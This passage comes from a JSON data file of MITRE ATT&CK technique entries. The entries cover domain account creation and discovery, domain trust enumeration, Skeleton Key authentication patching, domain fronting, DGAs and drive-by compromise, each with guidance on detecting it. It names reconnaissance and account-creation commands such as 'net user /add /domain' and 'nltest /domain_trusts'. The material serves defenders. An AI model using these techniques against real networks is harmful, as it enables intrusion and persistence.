Event\",\"url\":\"https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4720\"}],\"id\":\"attack-pattern--7610cada-1499-41a4-b3dd-46467b68d177\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-03-23T18:12:36.696Z\",\"name\":\"Domain Account\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"Process command-line parameters\",\"Authentication logs\",\"Windows event logs\"],\"x_mitre_detection\":\"Monitor for processes and command-line parameters associated with domain account creation, such as <code>net user /add /domain</code>. Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows domain controller. (Citation: Microsoft User Creation Event) Perform regular audits of domain accounts to detect suspicious accounts that may have been created by an adversary.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\"],\"x_mitre_platforms\":[\"Windows\",\"macOS\",\"Linux\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-21T21:08:26.480Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior.\\n\\nCommands such as <code>net user /domain</code> and <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscacheutil -q group</code>on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups.\",\"external_references\":[{\"external_id\":\"T1087.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1087/002\"},{\"external_id\":\"CAPEC-575\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/575.html\"}],\"id\":\"attack-pattern--21875073-b0ee-49e3-9077-1e2a885359af\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"discovery\"}],\"modified\":\"2020-03-26T13:42:34.402Z\",\"name\":\"Domain Account\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"API monitoring\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\\n\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-13T20:21:54.758Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. (Citation: TechNet Credential Theft) Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.(Citation: Microsoft AD Accounts)\\n\\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or password reuse, allowing access to privileged resources of the domain.\",\"external_references\":[{\"external_id\":\"T1078.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1078/002\"},{\"description\":\"Microsoft. (2016, April 15). Attractive Accounts for Credential Theft. Retrieved June 3, 2016.\",\"source_name\":\"TechNet Credential Theft\",\"url\":\"https://technet.microsoft.com/en-us/library/dn535501.aspx\"},{\"description\":\"Microsoft. (2019, August 23). Active Directory Accounts. Retrieved March 13, 2020.\",\"source_name\":\"Microsoft AD Accounts\",\"url\":\"https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-accounts\"},{\"description\":\"Microsoft. (2016, April 15). Audit Policy Recommendations. Retrieved June 3, 2016.\",\"source_name\":\"TechNet Audit Policy\",\"url\":\"https://technet.microsoft.com/en-us/library/dn487457.aspx\"}],\"id\":\"attack-pattern--c3d4bdd9-2cfe-4a80-9d0c-07a29ecdce8f\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"initial-access\"}],\"modified\":\"2020-03-23T21:08:40.063Z\",\"name\":\"Domain Accounts\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Authentication logs\",\"Process monitoring\"],\"x_mitre_detection\":\"Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services.(Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\\n\\nPerform regular audits of domain accounts to detect accounts that may have been created by an adversary for persistence.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\",\"Administrator\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-11T19:05:02.399Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may patch the authentication process on a domain control to bypass the typical authentication mechanisms and enable access to accounts. \\n\\nMalware may be used to inject false credentials into the authentication process on a domain control with the intent of creating a backdoor used to access any user’s account and/or credentials (ex: [Skeleton Key](https://attack.mitre.org/software/S0007)). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.(Citation: Dell Skeleton)\",\"external_references\":[{\"external_id\":\"T1556.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1556/001\"},{\"description\":\"Dell SecureWorks. (2015, January 12). Skeleton Key Malware Analysis. Retrieved April 8, 2019.\",\"source_name\":\"Dell Skeleton\",\"url\":\"https://www.secureworks.com/research/skeleton-key-malware-analysis\"},{\"description\":\"Microsoft. (2016, April 15). Audit Policy Recommendations. Retrieved June 3, 2016.\",\"source_name\":\"TechNet Audit Policy\",\"url\":\"https://technet.microsoft.com/en-us/library/dn487457.aspx\"}],\"id\":\"attack-pattern--d4b96d2c-1032-4b22-9235-2b5b649d0605\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-25T20:51:30.829Z\",\"name\":\"Domain Controller Authentication\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Authentication logs\",\"API monitoring\",\"DLL monitoring\"],\"x_mitre_detection\":\"Monitor for calls to <code>OpenProcess</code> that can be used to manipulate lsass.exe running on a domain controller as well as for malicious modifications to functions exported from authentication-related system DLLs (such as cryptdll.dll and samsrv.dll).(Citation: Dell Skeleton)\\n\\nConfigure robust, consistent account activity audit policies across the enterprise and with externally accessible services.(Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g. a user has an active login session but has not entered the building or does not have VPN access). \",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2018-01-16T16:13:52.465Z\",\"external_references\":[{\"external_id\":\"T1172\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1172\"},{\"description\":\"David Fifield, Chang Lan, Rod Hynes, Percy Wegmann, and Vern Paxson. (2015). Blocking-resistant communication through domain fronting. Retrieved November 20, 2017.\",\"source_name\":\"Fifield Blocking Resistent Communication through domain fronting 2015\",\"url\":\"http://www.icir.org/vern/papers/meek-PETS-2015.pdf\"}],\"id\":\"attack-pattern--1ce03c65-5946-4ac9-9d4d-66db87e024bd\",\"modified\":\"2020-03-14T23:29:54.083Z\",\"name\":\"Domain Fronting\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-03-14T23:29:19.581Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015) Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, \\\"domainless\\\" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).\\n\\nFor example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.\",\"external_references\":[{\"external_id\":\"T1090.004\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1090/004\"},{\"description\":\"David Fifield, Chang Lan, Rod Hynes, Percy Wegmann, and Vern Paxson. (2015). Blocking-resistant communication through domain fronting. Retrieved November 20, 2017.\",\"source_name\":\"Fifield Blocking Resistent Communication through domain fronting 2015\",\"url\":\"http://www.icir.org/vern/papers/meek-PETS-2015.pdf\"}],\"id\":\"attack-pattern--ca9d3402-ada3-484d-876a-d717bd6e05f2\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-06-20T20:53:20.398Z\",\"name\":\"Domain Fronting\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Matt Kelly, @breakersall\"],\"x_mitre_data_sources\":[\"SSL/TLS inspection\",\"Packet capture\"],\"x_mitre_detection\":\"If SSL inspection is in place or the traffic is not encrypted, the Host field of the HTTP header can be checked if it matches the HTTPS SNI or against a blocklist or allowlist of domain names. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-02-18T17:22:57.831Z\",\"external_references\":[{\"external_id\":\"T1483\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1483\"},{\"description\":\"Sternfeld, U. (2016). Dissecting Domain Generation Algorithms: Eight Real World DGA Variants. Retrieved February 18, 2019.\",\"source_name\":\"Cybereason Dissecting DGAs\",\"url\":\"http://go.cybereason.com/rs/996-YZT-709/images/Cybereason-Lab-Analysis-Dissecting-DGAs-Eight-Real-World-DGA-Variants.pdf\"},{\"description\":\"Scarfo, A. (2016, October 10). Domain Generation Algorithms – Why so effective?. Retrieved February 18, 2019.\",\"source_name\":\"Cisco Umbrella DGA\",\"url\":\"https://umbrella.cisco.com/blog/2016/10/10/domain-generation-algorithms-effective/\"},{\"description\":\"Unit 42. (2019, February 7). Threat Brief: Understanding Domain Generation Algorithms (DGA). Retrieved February 19, 2019.\",\"source_name\":\"Unit 42 DGA Feb 2019\",\"url\":\"https://unit42.paloaltonetworks.com/threat-brief-understanding-domain-generation-algorithms-dga/\"},{\"description\":\"Brumaghin, E. et al. (2017, September 18). CCleanup: A Vast Number of Machines at Risk. Retrieved March 9, 2018.\",\"source_name\":\"Talos CCleanup 2017\",\"url\":\"http://blog.talosintelligence.com/2017/09/avast-distributes-malware.html\"},{\"description\":\"Liu, H. and Yuzifovich, Y. (2018, January 9). A Death Match of Domain Generation Algorithms. Retrieved February 18, 2019.\",\"source_name\":\"Akamai DGA Mitigation\",\"url\":\"https://blogs.akamai.com/2018/01/a-death-match-of-domain-generation-algorithms.html\"},{\"description\":\"Dunwoody, M.. (2017, April 3). Dissecting One of APT29’s Fileless WMI and PowerShell Backdoors (POSHSPY). Retrieved April 5, 2017.\",\"source_name\":\"FireEye POSHSPY April 2017\",\"url\":\"https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html\"},{\"description\":\"ESET. (2017, December 21). Sednit update: How Fancy Bear Spent the Year. Retrieved February 18, 2019.\",\"source_name\":\"ESET Sednit 2017 Activity\",\"url\":\"https://www.welivesecurity.com/2017/12/21/sednit-update-fancy-bear-spent-year/\"},{\"description\":\"Jacobs, J. (2014, October 2). Building a DGA Classifier: Part 2, Feature Engineering. Retrieved February 18, 2019.\",\"source_name\":\"Data Driven Security DGA\",\"url\":\"https://datadrivensecurity.info/blog/posts/2014/Oct/dga-part2/\"},{\"description\":\"Chen, L., Wang, T.. (2017, May 5). Detecting Algorithmically Generated Domains Using Data Visualization and N-Grams Methods . Retrieved April 26, 2019.\",\"source_name\":\"Pace University Detecting DGA May 2017\",\"url\":\"http://csis.pace.edu/~ctappert/srd2017/2017PDF/d4.pdf\"},{\"description\":\"Ahuja, A., Anderson, H., Grant, D., Woodbridge, J.. (2016, November 2). Predicting Domain Generation Algorithms with Long Short-Term Memory Networks. Retrieved April 26, 2019.\",\"source_name\":\"Endgame Predicting DGA\",\"url\":\"https://arxiv.org/pdf/1611.00791.pdf\"}],\"id\":\"attack-pattern--54456690-84de-4538-9101-643e26437e09\",\"modified\":\"2020-03-20T19:51:55.085Z\",\"name\":\"Domain Generation Algorithms\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-03-10T17:44:59.787Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019)\\n\\nDGAs can take the form of apparently random or “gibberish” strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation)\\n\\nAdversaries may use DGAs for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)\",\"external_references\":[{\"external_id\":\"T1568.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1568/002\"},{\"description\":\"Sternfeld, U. (2016). Dissecting Domain Generation Algorithms: Eight Real World DGA Variants. Retrieved February 18, 2019.\",\"source_name\":\"Cybereason Dissecting DGAs\",\"url\":\"http://go.cybereason.com/rs/996-YZT-709/images/Cybereason-Lab-Analysis-Dissecting-DGAs-Eight-Real-World-DGA-Variants.pdf\"},{\"description\":\"Scarfo, A. (2016, October 10). Domain Generation Algorithms – Why so effective?. Retrieved February 18, 2019.\",\"source_name\":\"Cisco Umbrella DGA\",\"url\":\"https://umbrella.cisco.com/blog/2016/10/10/domain-generation-algorithms-effective/\"},{\"description\":\"Unit 42. (2019, February 7). Threat Brief: Understanding Domain Generation Algorithms (DGA). Retrieved February 19, 2019.\",\"source_name\":\"Unit 42 DGA Feb 2019\",\"url\":\"https://unit42.paloaltonetworks.com/threat-brief-understanding-domain-generation-algorithms-dga/\"},{\"description\":\"Brumaghin, E. et al. (2017, September 18). CCleanup: A Vast Number of Machines at Risk. Retrieved March 9, 2018.\",\"source_name\":\"Talos CCleanup 2017\",\"url\":\"http://blog.talosintelligence.com/2017/09/avast-distributes-malware.html\"},{\"description\":\"Liu, H. and Yuzifovich, Y. (2018, January 9). A Death Match of Domain Generation Algorithms. Retrieved February 18, 2019.\",\"source_name\":\"Akamai DGA Mitigation\",\"url\":\"https://blogs.akamai.com/2018/01/a-death-match-of-domain-generation-algorithms.html\"},{\"description\":\"Dunwoody, M.. (2017, April 3). Dissecting One of APT29’s Fileless WMI and PowerShell Backdoors (POSHSPY). Retrieved April 5, 2017.\",\"source_name\":\"FireEye POSHSPY April 2017\",\"url\":\"https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html\"},{\"description\":\"ESET. (2017, December 21). Sednit update: How Fancy Bear Spent the Year. Retrieved February 18, 2019.\",\"source_name\":\"ESET Sednit 2017 Activity\",\"url\":\"https://www.welivesecurity.com/2017/12/21/sednit-update-fancy-bear-spent-year/\"},{\"description\":\"Jacobs, J. (2014, October 2). Building a DGA Classifier: Part 2, Feature Engineering. Retrieved February 18, 2019.\",\"source_name\":\"Data Driven Security DGA\",\"url\":\"https://datadrivensecurity.info/blog/posts/2014/Oct/dga-part2/\"},{\"description\":\"Chen, L., Wang, T.. (2017, May 5). Detecting Algorithmically Generated Domains Using Data Visualization and N-Grams Methods . Retrieved April 26, 2019.\",\"source_name\":\"Pace University Detecting DGA May 2017\",\"url\":\"http://csis.pace.edu/~ctappert/srd2017/2017PDF/d4.pdf\"},{\"description\":\"Ahuja, A., Anderson, H., Grant, D., Woodbridge, J.. (2016, November 2). Predicting Domain Generation Algorithms with Long Short-Term Memory Networks. Retrieved April 26, 2019.\",\"source_name\":\"Endgame Predicting DGA\",\"url\":\"https://arxiv.org/pdf/1611.00791.pdf\"}],\"id\":\"attack-pattern--118f61a5-eb3e-4fb6-931f-2096647f4ecd\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-03-12T14:45:22.784Z\",\"name\":\"Domain Generation Algorithms\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Ryan Benson, Exabeam\",\"Barry Shteiman, Exabeam\",\"Sylvain Gil, Exabeam\"],\"x_mitre_data_sources\":[\"DNS records\",\"Netflow/Enclave netflow\",\"Network device logs\",\"Packet capture\",\"Process use of network\"],\"x_mitre_detection\":\"Detecting dynamically generated domains can be challenging due to the number of different DGA algorithms, constantly evolving malware families, and the increasing complexity of the algorithms. There is a myriad of approaches for detecting a pseudo-randomly generated domain name, including using frequency analysis, Markov chains, entropy, proportion of dictionary words, ratio of vowels to other characters, and more.(Citation: Data Driven Security DGA) CDN domains may trigger these detections due to the format of their domain names. In addition to detecting a DGA domain based on the name, another more general approach for detecting a suspicious domain is to check for recently registered names or for rarely visited domains.\\n\\nMachine learning approaches to detecting DGA domains have been developed and have seen success in applications. One approach is to use N-Gram methods to determine a randomness score for strings used in the domain name. If the randomness score is high, and the domains are not whitelisted (CDN, etc), then it may be determined if a domain or related to a legitimate host or DGA.(Citation: Pace University Detecting DGA May 2017) Another approach is to use deep learning to classify domains as DGA-generated.(Citation: Endgame Predicting DGA)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-21T21:15:06.561Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.\\n\\nCommands such as <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups.\",\"external_references\":[{\"external_id\":\"T1069.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1069/002\"}],\"id\":\"attack-pattern--2aed01ad-3df3-4410-a8cb-11ea4ded587c\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"discovery\"}],\"modified\":\"2020-03-12T19:07:53.043Z\",\"name\":\"Domain Groups\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"API monitoring\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\\n\\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-02-14T16:15:05.974Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct [SID-History Injection](https://attack.mitre.org/techniques/T1134/005), [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003), and [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility [Nltest](https://attack.mitre.org/software/S0359) is known to be used by adversaries to enumerate domain trusts.(Citation: Microsoft Operation Wilysupply)\",\"external_references\":[{\"external_id\":\"T1482\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1482\"},{\"description\":\"Microsoft. (2009, October 7). Trust Technologies. Retrieved February 14, 2019.\",\"source_name\":\"Microsoft Trusts\",\"url\":\"https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759554(v=ws.10)\"},{\"description\":\"Metcalf, S. (2015, July 15). It’s All About Trust – Forging Kerberos Trust Tickets to Spoof Access across Active Directory Trusts. Retrieved February 14, 2019.\",\"source_name\":\"AdSecurity Forging Trust Tickets\",\"url\":\"https://adsecurity.org/?p=1588\"},{\"description\":\"Schroeder, W. (2017, October 30). A Guide to Attacking Domain Trusts. Retrieved February 14, 2019.\",\"source_name\":\"Harmj0y Domain Trusts\",\"url\":\"http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/ \"},{\"description\":\"Florio, E.. (2017, May 4). Windows Defender ATP thwarts Operation WilySupply software supply chain cyberattack. Retrieved February 14, 2019.\",\"source_name\":\"Microsoft Operation Wilysupply\",\"url\":\"https://www.microsoft.com/security/blog/2017/05/04/windows-defender-atp-thwarts-operation-wilysupply-software-supply-chain-cyberattack/\"},{\"description\":\"Microsoft. (n.d.). Domain.GetAllTrustRelationships Method. Retrieved February 14, 2019.\",\"source_name\":\"Microsoft GetAllTrustRelationships\",\"url\":\"https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectory.domain.getalltrustrelationships?redirectedfrom=MSDN&view=netframework-4.7.2#System_DirectoryServices_ActiveDirectory_Domain_GetAllTrustRelationships\"}],\"id\":\"attack-pattern--767dbf9e-df3f-45cb-8998-4903ab5f80c0\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"discovery\"}],\"modified\":\"2020-03-26T16:13:21.085Z\",\"name\":\"Domain Trust Discovery\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Dave Westgard\",\"Elia Florio, Microsoft\",\"Mnemonic\",\"RedHuntLabs, @redhuntlabs\"],\"x_mitre_data_sources\":[\"PowerShell logs\",\"API monitoring\",\"Process command-line parameters\",\"Process monitoring\"],\"x_mitre_detection\":\"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation but as part of a chain of behavior that could lead to other activities based on the information obtained.\\n\\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information, such as `nltest /domain_trusts`. Remote access tools with built-in features may interact directly with the Windows API to gather information. Look for the `DSEnumerateDomainTrusts()` Win32 API call to spot activity associated with [Domain Trust Discovery](https://attack.mitre.org/techniques/T1482).(Citation: Harmj0y Domain Trusts) Information may also be acquired through Windows system management tools such as [PowerShell](https://attack.mitre.org/techniques/T1059/001). The .NET method `GetAllTrustRelationships()` can be an indicator of [Domain Trust Discovery](https://attack.mitre.org/techniques/T1482).(Citation: Microsoft GetAllTrustRelationships)\\n\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2018-04-18T17:59:24.739Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user\'s web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring [Application Access Token](https://attack.mitre.org/techniques/T1550/001).\\n\\nMultiple ways of delivering exploit code to a browser exist, including:\\n\\n* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting.\\n* Malicious ads are paid for and served through legitimate ad providers.\\n* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).\\n\\nOften the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted attack is referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.(Citation: Shadowserver Strategic Web Compromise)\\n\\nTypical drive-by compromise process:\\n\\n1. A user visits a website that is used to host the adversary controlled content.\\n2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. \\n    * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.\\n3. Upon finding a vulnerable version, exploit code is delivered to the browser.\\n4. If exploitation is successful, then it will give the adversary code execution on the user\'s system unless other protections are in place.\\n    * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.\\n\\nUnlike [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.\\n\\nAdversaries may also use compromised websites to deliver a user to a malicious application designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.(Citation: Volexity OceanLotus Nov 2017)\",\"external_references\":[{\"external_id\":\"T1189\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1189\"},{\"description\":\"Adair, S., Moran, N. (2012, May 15). Cyber Espionage & Strategic Web Compromises – Trusted Websites Serving Dangerous Results. Retrieved March 13, 2018.\",\"source_name\":\"Shadowserver Strategic Web Compromise\",\"url\":\"http://blog.shadowserver.org/2012/05/15/cyber-espionage-strategic-web-compromises-trusted-websites-serving-dangerous-results/\"},{\"description\":\"Lassalle, D., et al. (2017, November 6). OceanLotus Blossoms: Mass Digital Surveillance and Attacks Targeting ASEAN, Asian Nations, the Media, Human Rights Groups, and Civil Society. Retrieved November 6, 2017.\",\"source_name\":\"Volexity OceanLotus Nov 